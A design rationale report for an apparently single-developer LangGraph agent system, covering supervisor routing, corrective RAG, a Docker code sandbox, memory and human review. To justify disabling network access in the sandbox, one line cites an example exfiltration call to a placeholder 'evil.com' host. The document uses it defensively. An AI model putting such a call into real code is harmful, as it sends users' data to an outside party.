# Design Rationale Report

> Why we built each part the way we did, what alternatives existed, and why they were rejected.

---

## 1. Overall Architecture: Supervisor-Worker Pattern

### What it is
A single Supervisor graph owns the user query. It decomposes the query into a plan of
sub-tasks, then routes each task to a specialized sub-graph (RAG or Code). After all tasks
finish, a Synthesizer merges the results.

### Why this design

**The core problem is task heterogeneity.** A user might ask: *"Research the best sorting
algorithms for large datasets, then write a Python benchmark comparing them."* That is
two fundamentally different operations — information retrieval and code execution — that
need different tools, different prompts, and different error handling. A single flat agent
would need to carry all that complexity in one graph.

**The supervisor pattern solves this by separating concerns:**
- The Supervisor only thinks about *what* to do (planning + routing). It never touches
  Qdrant, Docker, or web search directly.
- Each sub-graph only thinks about *how* to do its specific job. The RAG graph doesn't
  know code exists. The Code graph doesn't know about retrieval.
- This makes each piece independently testable, replaceable, and debuggable.

**Why not a flat multi-agent graph?** In a flat graph, all agents share one state and one
set of edges. Adding a new capability (say, a database query agent) means rewiring the
entire graph. With the supervisor pattern, you just add a new sub-graph and a new routing
condition. The supervisor itself doesn't change.

**Why not a fully autonomous agent (e.g., ReAct loop)?** ReAct agents decide their own
next action at every step. This is powerful but unpredictable — they can loop, waste tokens,
or take unexpected paths. The supervisor's explicit plan gives us *predictable routing*
with a clear iteration cap. The user can see the plan before execution starts. This
matters for a system that will eventually have human-in-the-loop approval.

---

## 2. Task Planning: intake_planner Node

### What it is
An LLM call that takes the user's raw query and outputs a JSON list of typed sub-tasks.
Each task has a description and a type: `research`, `code`, or `hybrid`.

### Why this design

**We need the plan to be structured, not free-text.** The router makes branching decisions
based on task type. If the planner outputs free-form text, we'd need another LLM call to
classify each task. Structured JSON output eliminates that second call and removes
ambiguity.

**Why JSON instead of function calling / tool_use?** Function calling works well but adds
coupling to a specific LLM provider's API. Plain JSON output works with any model that
can follow instructions. Our fallback (if JSON parse fails, treat the whole query as a
single research task) means the system never crashes on malformed output — it degrades
gracefully.

**Why decompose at all? Why not send the whole query to both sub-graphs?**
Because many queries are *sequential* — the code task depends on research results. If you
ask "find the latest GDP data for Japan and plot it," the code can't run until the data is
found. The plan's ordering encodes these dependencies. It also prevents wasting tokens on
unnecessary sub-graph invocations (a pure research question doesn't need the code path).

---

## 3. Router: Conditional Edge Routing

### What it is
A simple function that reads `plan[current_task_index]`, extracts the task type prefix
(`[research]`, `[code]`, `[hybrid]`), and returns a string that LangGraph's conditional
edges use to pick the next node.

### Why this design

**The router is intentionally not an LLM call.** It's pure Python logic — parse a string
prefix, return a routing decision. This is a deliberate choice:
- Zero latency, zero tokens, zero cost per routing decision.
- 100% deterministic — the same plan always routes the same way.
- Trivially testable (5 unit tests, no mocking needed).

**The LLM already made the classification decision** in the planner step. Having the router
re-classify with another LLM call would be redundant and slow.

**The iteration counter is a safety mechanism.** Without it, a malformed plan or a bug in
the sub-graphs could cause infinite loops. The `max_iterations` cap (default 10) guarantees
the graph terminates. When hit, the router signals `done` and the system synthesizes
whatever partial results it has.

---

## 4. Corrective RAG (CRAG) Sub-Graph

### What it is
A retrieval-augmented generation pipeline with self-correction:
1. Retrieve documents from Qdrant
2. LLM grades each document for relevance
3. If relevant: generate answer. If ambiguous: rewrite query and retry. If irrelevant:
   fall back to web search.

### Why CRAG over naive RAG

**Naive RAG (retrieve → generate) has a silent failure mode.** If the retrieved documents
are irrelevant, the LLM will still generate an answer — it will just be wrong or
hallucinated. The user has no way to know the retrieval failed. CRAG adds an explicit
quality check after retrieval. The system *knows* when it doesn't have good sources and
takes corrective action.

**Why CRAG over Self-RAG?** Self-RAG embeds retrieval decisions *inside* the generation
step — the LLM generates tokens, then mid-stream decides whether to retrieve more
documents. This is elegant in theory but:
- Harder to implement as discrete LangGraph nodes (it's inherently a single-step process)
- Harder to debug (the retrieval decision is implicit in the generation)
- More complex prompting with marginal quality improvement for our use case

CRAG's explicit retrieve→grade→decide flow maps perfectly to LangGraph's node+edge model.
Each step is independently observable and testable.

### Why the 3-tier grading (relevant / ambiguous / irrelevant)

**Two tiers (relevant/irrelevant) would be too coarse.** Consider: you retrieve 5 documents
and only 1 is relevant. Is that enough to generate a good answer? Maybe, maybe not.
The "ambiguous" tier captures this middle ground and triggers a query rewrite — a
lightweight corrective action before the heavier web search fallback.

The thresholds are simple: 2+ relevant docs = relevant, 1 = ambiguous, 0 = irrelevant.
This is intentionally unsophisticated. Fancy scoring can come later; what matters now is
that the *control flow exists*.

### Why vector score pre-filtering before LLM grading

The grader calls the LLM once per document. With 5 retrieved docs, that's 5 LLM calls.
The vector score pre-filter (`score < threshold * 0.5`) skips documents that are clearly
irrelevant, saving tokens. If Qdrant returns a doc with cosine similarity 0.2, there's no
point asking the LLM whether it's relevant.

### Why DuckDuckGo instead of Tavily

**Purely practical — no API key available.** Tavily is purpose-built for LLM-augmented
search and returns cleaner results. DuckDuckGo is a general search API with occasional
rate limiting. If a Tavily key becomes available, the swap is a single-node change
(`web_search` in `nodes/rag.py`). The rest of the graph doesn't care where the documents
come from.

---

## 5. Vector Database: Qdrant

### Why Qdrant over alternatives

| Option     | Pros                       | Cons for us                    |
|------------|----------------------------|--------------------------------|
| Qdrant     | Docker-native, good Python SDK, filtering support | External process |
| ChromaDB   | In-process, zero-config    | Weaker at scale, limited filtering |
| Pinecone   | Managed, scalable          | Paid, external dependency      |
| FAISS      | Fast, in-process           | No metadata filtering, no persistence out of box |

**Qdrant wins because:**
- It runs alongside our code sandbox in Docker — one `docker compose up` starts everything
- It persists data to a volume (survives restarts)
- Metadata filtering will be useful later (filter by source, date, topic)
- The Python SDK mirrors the mental model of our search function well

**ChromaDB was the runner-up** but lacks Qdrant's filtering capabilities and has had
stability issues in high-throughput scenarios. For a system that will eventually store
long-term memory across many sessions, Qdrant's architecture is a better fit.

---

## 6. Embeddings: Local sentence-transformers

### Why local over API-based

**Cost and latency.** Every document ingestion and every retrieval query requires an
embedding call. With OpenAI's API, that's a network round-trip and a per-token charge on
every single search. With `all-MiniLM-L6-v2` running locally:
- Zero cost per embedding
- ~5ms per embedding (vs ~200ms for API call)
- No rate limits, no API key needed
- Works offline

**Why `all-MiniLM-L6-v2` specifically?**
- 384-dimension vectors (small, fast to search)
- 80MB model size (loads in <1 second)
- Consistently top-ranked for its size class on MTEB benchmarks
- Battle-tested in production at many companies

**The trade-off:** lower embedding quality than `text-embedding-3-small` (OpenAI). For our
use case — retrieving relevant technical documents from a relatively small corpus — the
quality difference is negligible. If retrieval quality becomes a problem, we can swap the
model by changing one line in `config.py`.

### Why a singleton pattern

The model is 80MB. Loading it on every function call would add ~1 second of latency per
search. The singleton (`_model` global, lazy-loaded on first call) ensures we load once
and reuse.

---

## 7. State Schemas: TypedDict Design

### Why TypedDict over Pydantic or dataclass

**LangGraph's state channels work natively with TypedDict.** Using Pydantic would require
serialization/deserialization at every node boundary. TypedDict is the idiomatic choice
for LangGraph — it's what the framework's `add_messages` reducer expects.

### Why three separate state schemas

Each graph has fundamentally different data needs:
- **SupervisorState** tracks the plan, task index, and aggregated results
- **RAGState** tracks query rewrites, document grades, and retrieval history
- **CodeState** tracks generated code, execution output, and retry counts

Merging them into one schema would mean every node carries fields it never uses. Worse,
it would create namespace collisions (both RAG and Code have a concept of "retry count"
but with different semantics). Separate schemas make each sub-graph self-contained.

### Why `Annotated[list, add_messages]` for messages

LangGraph's `add_messages` reducer intelligently appends new messages to the existing list
(deduplicating by ID if needed). Without it, every node would overwrite the entire message
history. This is critical for maintaining conversation context across multiple node
invocations.

---

## 8. Checkpointer: SQLite

### Why checkpointing at all

**LangGraph graphs can be interrupted and resumed.** This is essential for:
- Human-in-the-loop (Phase 6): pause at `human_review`, wait for user input, resume
- Crash recovery: if the process dies mid-execution, resume from last checkpoint
- Debugging: inspect state at any point in the execution

### Why SQLite over PostgreSQL

**Development simplicity.** SQLite is a single file, zero configuration, included in
Python's standard library. PostgreSQL requires a running server, connection strings, and
migrations. For a single-developer project, SQLite is the right choice.

**The migration path is trivial:** swap `SqliteSaver` for `PostgresSaver` and change
the connection string. The rest of the code doesn't change. We'll do this if/when we
need concurrent access or multi-user support.

---

## 9. Testing Strategy

### Why mock the LLM in tests

**Determinism and cost.** LLM responses are non-deterministic — the same prompt can
produce different outputs on different runs. Tests that call a real LLM are:
- Flaky (might pass today, fail tomorrow)
- Slow (~1-2 seconds per LLM call vs ~1ms for a mock)
- Expensive (every test run burns tokens)

By mocking `_get_llm()` and returning `AIMessage` objects, we test the *graph logic* (did
the right nodes execute in the right order?) without testing the LLM's intelligence.

### Why test all three CRAG paths

The CRAG graph has three distinct execution paths:
1. Relevant → generate (happy path)
2. Irrelevant → web search → generate (fallback path)
3. Ambiguous → rewrite → retrieve → grade → generate (retry path)

Each path exercises different nodes and edges. Testing only the happy path would leave
the corrective behavior — the entire point of CRAG — unverified. The ambiguous path test
specifically verifies that the rewrite loop works (retrieve is called twice, rewrite_count
increments).

---

## 10. Docker Compose for Container Management

### Why compose over manual `docker run`

**Reproducibility.** `docker run` commands with port mappings, volume mounts, and names
are easy to get wrong. Docker Compose encodes the full container configuration
declaratively. `./scripts/start.sh` and `./scripts/stop.sh` make it a single command.

**Future-proofing.** Phase 4 adds a code sandbox container. Phase 7 might add monitoring.
Compose scales to multiple services naturally — you just add another entry. Manual
`docker run` commands don't compose well.

---

## 11. Docker Sandbox: Long-Running Container with `docker exec`

### What it is
A persistent Docker container (`fetcher-sandbox`) running `sleep infinity`. Code is
executed by calling `docker exec` to run a Python command inside the already-running
container.

### Why a persistent container instead of per-execution containers

**Cold start penalty.** Creating a new container per execution takes 500ms–2s (image pull
check, filesystem setup, process launch). The self-correction loop may execute code 3–4
times per task. A persistent container eliminates this overhead entirely — `docker exec`
starts in ~50ms.

**Resource predictability.** One long-running container with `mem_limit: 512m` and `cpus: 1.0`
is easier to reason about than a variable number of short-lived containers competing for
resources.

**The trade-off:** state leaks between executions. If one code run writes a file, the next
run can see it. For our use case this is acceptable — each code task is independent, and
the sandbox runs as a non-root user with limited filesystem access. If isolation between
runs becomes critical, we can add a cleanup step or switch to per-execution containers.

### Why `network_mode: none`

**Security.** The sandbox executes LLM-generated code. If the code contains `requests.get("https://evil.com/exfiltrate?data=...")`,
it should fail silently. Disabling network access is the simplest, most robust defense.

The pre-installed packages (numpy, pandas, matplotlib) all work offline. The only casualty
is `requests`, which we include for data parsing tasks but which cannot make actual HTTP
calls from inside the sandbox. If a task genuinely needs network access, we'd need to
rethink this — but that's a conscious security decision, not a default.

### Why non-root user

Defense in depth. Even without network, the container runs as `sandbox` user rather than
root. This prevents code from modifying system files, installing packages, or escalating
privileges inside the container.

---

## 12. Code Self-Correction: Separate Prompts for First Attempt vs Retry

### What it is
The `coder` node uses two different system prompts: one for the initial generation and one
for retries. The retry prompt includes the previous code and the specific error feedback.

### Why not one prompt with optional error context

**Prompt focus.** When the LLM sees a clean task description, it approaches it from scratch
with full creative latitude. When it sees a task + broken code + error, we want it to
focus narrowly on *fixing the specific error*, not reimagining the approach. Different
prompts produce different LLM behaviors.

**The retry prompt explicitly says "fix the code based on the error."** Without this framing,
the LLM sometimes ignores the error and rewrites from scratch — producing the same bug.
The dedicated prompt keeps it focused on the traceback.

---

## 13. Critic Node: Skip LLM When Execution Already Failed

### What it is
If `exit_code != 0`, the critic immediately returns `is_verified=False` with the stderr
as feedback, without calling the LLM.

### Why this matters

**Token savings.** If Python raises `NameError: name 'x' is not defined`, asking the LLM
"is this output correct?" is a waste. The error is self-evident. Skipping the LLM call
saves ~500 tokens per failed execution. In a 3-retry loop, that's 1500 tokens saved.

**Speed.** Each skipped LLM call saves ~1 second of latency.

The LLM critic is only invoked when code *runs successfully* but might produce *wrong
results* — the harder judgment that requires understanding the task intent.

---

## 14. Adapter Pattern: Integration Layer Between Supervisor and Sub-Graphs

### What it is
`nodes/integration.py` contains `rag_node`, `code_node`, and `hybrid_node`. Each function
accepts `SupervisorState`, extracts the relevant fields, creates a sub-graph initial state,
invokes the compiled sub-graph, and merges results back into `SupervisorState`.

### Why an adapter layer instead of embedding sub-graphs directly

**State schema mismatch.** `SupervisorState` has fields like `plan`, `current_task_index`,
`research_results` that don't exist in `RAGState`. And `RAGState` has fields like
`rewrite_count`, `retrieval_grade` that the supervisor doesn't need. Direct embedding
would require either a unified mega-state (wasteful, collision-prone) or LangGraph's
sub-graph nesting (which requires compatible state schemas).

The adapter pattern keeps each sub-graph fully self-contained with its own state schema.
The integration layer is the only place that knows about both schemas. If we change
`RAGState`, only `rag_node` in `integration.py` needs updating — the supervisor and
code sub-graph are unaffected.

### Why `use_stubs` flag instead of removing stubs

**Test isolation.** The 7 original supervisor tests verify routing logic. They don't need
Docker, Qdrant, or real sub-graphs. Making them depend on those services would make them
slow and brittle. The `use_stubs=True` flag preserves the fast, isolated test path while
`use_stubs=False` (default) uses real sub-graphs in production.

---

## 15. Long-Term Memory: Separate Collection, Best-Effort Operations

### What it is
`utils/memory.py` stores task results in a dedicated Qdrant collection (`fetcher_memory`)
and recalls relevant past results before each sub-graph invocation.

### Why a separate collection from document store

**Different data, different lifecycle.** `fetcher_docs` holds user-ingested reference
documents. `fetcher_memory` holds system-generated results from past queries. They have
different update patterns (docs are ingested in bulk; memories accumulate per-query) and
different relevance semantics (doc search is "find similar content"; memory search is
"find past work on similar tasks").

Keeping them separate means we can wipe memory without losing the document corpus, apply
different retention policies, and avoid memory results contaminating document retrieval.

### Why best-effort (silent failure)

**Memory is an enhancement, not a dependency.** If Qdrant is down, the system should still
work — it just won't have access to past context. Making memory operations crash the
pipeline would mean a Qdrant restart kills an otherwise functional system. The `try/except`
with `pass` ensures graceful degradation.

This is a deliberate trade-off: we sacrifice observability (failed memory ops are invisible)
for reliability. In Phase 6, LangSmith tracing will make these failures visible without
making them fatal.

### Why recall context before sub-graph invocation

**Cross-session continuity.** If the user asked about "Python async patterns" yesterday
and asks about "concurrent programming in Python" today, the memory recall surfaces
yesterday's research as context. This makes the system get smarter over time without
re-doing work.

The recall threshold (0.5 cosine similarity) is deliberately low — we'd rather include
marginally relevant context than miss useful past work. The LLM can ignore irrelevant
context; it can't use context it never receives.

---

## 16. Cross-Sub-Graph Context: Research → Code

### What it is
When the code sub-graph runs, all accumulated `research_results` are concatenated and
passed as the `context` parameter to the coder node.

### Why this matters

**Grounding code in research.** If the plan is: (1) research sorting algorithms, (2) write
a benchmark — the coder needs to know *which* algorithms were found in step 1. Without
context passing, the coder would generate code based only on the task description, ignoring
all research findings.

### Why simple concatenation

All research answers are joined with `\n\n`. This is naive — it doesn't select the most
relevant research for the specific code task, and it could exceed context windows for
many research results. But it works for typical plans (1-4 tasks) and defers the complexity
of selective context to a future optimization.

---

## 17. HITL: `interrupt()` Over `interrupt_before`

### What it is
The `human_review` node calls `interrupt()` from inside the node function, passing context
(the draft answer and execution plan) and receiving the human's feedback as the return value.

### Why `interrupt()` instead of `interrupt_before`

LangGraph offers two mechanisms for pausing a graph:
- `interrupt_before=["node_name"]` at compile time — pauses *before* the node runs
- `interrupt()` called *inside* a node — pauses mid-execution and returns when resumed

**`interrupt()` wins because:**

1. **Context passing.** We want to show the human the draft answer and plan *at interrupt
   time*. With `interrupt_before`, the node hasn't run yet, so any context must come from
   the previous node's state. With `interrupt()`, the node itself decides what to present.

2. **Typed feedback.** The `interrupt()` return value *is* the human's feedback. We parse
   it directly: empty/"approve" → proceed, "reject:reason" → re-plan, anything else →
   revision. With `interrupt_before`, feedback would need to be injected into the state
   manually before resuming.

3. **Simpler routing.** The node processes the feedback and sets state fields that the
   downstream conditional edge reads. Everything is self-contained in the node function.

### Why three feedback paths

| Feedback | Route | Cost | When to use |
|----------|-------|------|------------|
| approve | finalize | Free | Answer is satisfactory |
| reject:reason | intake_planner | Expensive (full re-plan) | Fundamentally wrong approach |
| revision text | revise_synthesis | Cheap (one LLM call) | Answer needs adjustment |

**Why not just "approve/reject"?** Most real feedback is *revision*, not rejection. "Add
more detail about X" doesn't require re-planning — it just needs a better synthesis from
the same sub-results. The three-way split handles the common case cheaply.

**Why allow unlimited revision loops?** `revise_synthesis → human_review` has no iteration
cap. The human is in control and can approve at any time. Adding a cap would force
auto-approval of a potentially unsatisfactory answer.

---

## 18. CLI: Streaming vs Sync Modes

### What it is
`cli.py` supports two modes: `--stream` (async with `astream_events`) and default sync
(`invoke` with blocking HITL prompts).

### Why both modes

**Streaming is better UX** — the user sees tokens as they're generated, which makes long
LLM calls feel faster. But streaming adds complexity: async event loop, event filtering,
and careful output formatting.

**Sync mode exists for debugging** and for environments where async is problematic. It
uses `invoke()`, which blocks until the graph hits an interrupt or completes. The HITL
flow works identically in both modes.

### Why `astream_events` v2

LangGraph's `astream_events(version="v2")` provides fine-grained events including
`on_chat_model_stream` for token-level chunks. Version 1 has a different event schema
that's harder to filter. V2 is the current recommended version.

---

## 19. LangSmith Tracing: Env-Var Gated Activation

### What it is
When `LANGSMITH_API_KEY` is set in the environment, `config.py` automatically configures
the `LANGCHAIN_TRACING_V2`, `LANGCHAIN_API_KEY`, and `LANGCHAIN_PROJECT` env vars that
LangChain/LangGraph read to enable LangSmith tracing.

### Why env-var gating

**Zero-code opt-in.** The user doesn't need to modify any Python code to enable tracing.
Just set one env var and all LLM calls, graph transitions, and node executions are traced.

**`setdefault` not `setitem`.** We use `os.environ.setdefault()` so that if the user
has explicitly set `LANGCHAIN_PROJECT` to a custom value, we don't override it. The
config module provides sensible defaults without being opinionated.

**Why not always-on?** LangSmith requires an API key and sends data to an external service.
Making it opt-in respects the user's privacy and avoids cryptic errors when the key is
missing.

---

## 20. Error Handling: Graceful Degradation Over Hard Failure

### The principle
Every external call (LLM, Docker, Qdrant) can fail. When it does, the system should
produce *something usable* rather than crash. The user gets a lower-quality result, but
they get a result.

### Why not retry?
Retries add latency and complexity. For transient errors (network blips), the self-correction
loops already handle retries at a higher level (CRAG rewrites, code retry loop). Adding
per-call retries would slow the happy path for marginal reliability gains.

### Specific fallback strategy

| Component | Fallback | Rationale |
|-----------|----------|-----------|
| Planner LLM | Single research task | Conservative: research everything, code nothing |
| Synthesizer LLM | Raw sub-results | User sees what was gathered, can judge quality |
| Coder LLM | Empty code | Executor reports "No code to execute" → clean error flow |
| Critic LLM | Optimistic pass | Code ran successfully; infrastructure failure shouldn't penalize |
| Grader LLM (per-doc) | Fall back to vector score | High vector score ≈ relevant; skip the doc only if score is low |
| Rewrite LLM | Use original query | Better to re-search with the same query than crash |
| Generate LLM | Raw documents | User sees sources, can synthesize manually |
| Sub-graph crash | Error message, advance task | One failed task shouldn't block the plan |

### Why exit code 124 for sandbox timeouts?
Convention. The Unix `timeout` command uses exit code 124. Any tooling that checks for
timeouts will recognize this code. It also distinguishes timeout (124) from execution
error (non-zero) and success (0).

---

## 21. SqliteSaver: Direct Constructor Over `from_conn_string`

### What happened
`SqliteSaver.from_conn_string()` is a generator (context manager), not a direct constructor.
LangGraph 1.1.3's `graph.compile(checkpointer=...)` expects a `BaseCheckpointSaver` instance.
Passing a generator causes `TypeError: Invalid checkpointer provided`.

### The fix
```python
# Before (broken):
checkpointer = SqliteSaver.from_conn_string(f"sqlite:///{SQLITE_DB_PATH}")

# After (correct):
checkpointer = SqliteSaver(conn=sqlite3.connect(SQLITE_DB_PATH, check_same_thread=False))
```

`check_same_thread=False` is needed because LangGraph may access the connection from
different threads (e.g., in async streaming mode). SQLite itself is thread-safe in
serialized mode (the default), but Python's `sqlite3` module raises an error without
this flag.

---

## 22. Reviewer Feedback: Planned Architectural Changes

### Context
A reviewer evaluated the system and identified several gaps. This section documents the
planned responses and the reasoning behind the phased approach.

### Self-evolving memory (Phase 8)

**Current state:** `utils/memory.py` stores raw task+result pairs in Qdrant. Recall is
pure vector similarity. No learning, no pruning, no structure.

**What's missing:** The memory doesn't *improve* the system over time. Storing "Python
decorators are functions that modify functions" doesn't help future queries about
decorators unless the exact phrasing is similar.

**Planned approach:**
- **Knowledge extraction:** After each run, an LLM pass extracts *reusable patterns*
  (e.g., "DuckDuckGo works better for recent topics; Qdrant retrieval works better for
  documented concepts"). Store patterns separately from raw results.
- **Relevance decay:** Older memories get lower weight. A result from 100 queries ago is
  less likely to be relevant than a recent one.
- **Pruning:** Periodic cleanup of low-utility memories (never recalled, very old, duplicate).

**Why not now:** Self-evolving memory requires careful design to avoid drift (storing
incorrect patterns) and bloat (storing everything). It needs evaluation metrics to verify
that memory actually improves outcomes.

### Synthesizer sub-result verification (Phase 9)

**Current state:** The synthesizer trusts all sub-results equally. If the RAG sub-graph
returns garbage (e.g., web search failed silently), the synthesis incorporates it.

**What's missing:** No quality signal on sub-results. The synthesizer can't distinguish
"high-confidence research finding" from "fallback empty result."

**Planned approach:**
- Each sub-result gets a quality score (0-1) based on: was web search used (lower
  confidence), did code execute successfully, how many graded-relevant docs were found.
- The synthesizer prompt includes quality annotations: `[HIGH confidence] Quicksort is
  O(n log n)` vs `[LOW confidence] No relevant documents found`.
- Sub-results below a threshold trigger automatic re-execution of that task.

### DAG task decomposition (Phase 9)

**Current state:** Planner outputs `[{"type": "research", "description": "..."}]` — a
flat, sequential list. Tasks execute one after another, even if independent.

**What's missing:** If the plan is: (1) research sorting algorithms, (2) research Python
benchmarking tools, (3) write benchmark code — tasks 1 and 2 are independent and could
run in parallel. The sequential model wastes time.

**Planned approach:**
- Planner outputs `{"tasks": [...], "dependencies": {"2": ["0", "1"]}}` — each task lists
  its dependencies by index.
- Router becomes a scheduler: maintain a "ready queue" of tasks whose dependencies are
  all complete. Dispatch ready tasks (potentially in parallel via `asyncio.gather`).
- Sequential plans are a degenerate case of DAGs (each task depends on the previous).

**Why DAG over other approaches:** A full agent loop (ReAct) would be more flexible but
less predictable. DAG keeps the plan explicit and inspectable — the human can see what
will run in parallel before approving. It's also easier to test than emergent behavior.

### DuckDuckGo improvements (Phase 8)

**Current state:** Single search call, 5 results, bare `except` on failure.

**What's missing:** No quality signal on search results. If DuckDuckGo returns irrelevant
results (common for technical queries), we pass them to the generator as if they're useful.

**Planned approach:**
- **Multi-query expansion:** For a query like "Python async patterns," also search
  "Python asyncio tutorial" and "Python coroutine best practices." Merge and deduplicate.
- **Result quality scoring:** LLM grades each web result for relevance (similar to doc
  grading). This already exists for retrieved docs but not for web search results.
- **Fallback chain:** DuckDuckGo → memory recall → report "insufficient data." Better
  than silently returning low-quality results.

---

## Decisions I Would Revisit

These are choices that are correct *for now* but may need to change:

1. **gpt-4o-mini for grading**: The document grader uses the cheap model. If grading
   accuracy becomes a bottleneck (too many false positives/negatives), upgrading to gpt-4o
   for just the grader node is a one-line change.

2. ~~**Fixed top-5 retrieval**~~ — Planned for Phase 8. Adaptive top-k based on query
   complexity.

3. ~~**No chunking in ingestion**~~ — Planned for Phase 8. Document ingestion pipeline
   with recursive character + semantic chunking.

4. ~~**Stub-based integration testing**~~ — Resolved in Phase 5.

5. **Sandbox state leaks**: The persistent container doesn't clean up between runs. If
   tasks start interfering with each other, add a cleanup step (remove temp files) or
   switch to per-execution containers with a warm pool.

6. **Fixed sandbox packages**: Only numpy/pandas/matplotlib/requests are pre-installed.
   If the LLM generates code requiring other packages, it will fail. Planned for Phase 10.

7. ~~**Naive context concatenation**~~ — Planned for Phase 9. Selective context based on
   task-to-research relevance scoring.

8. **Flat sequential task plan** — Planned for Phase 9. DAG-based decomposition with
   parallel execution of independent tasks.
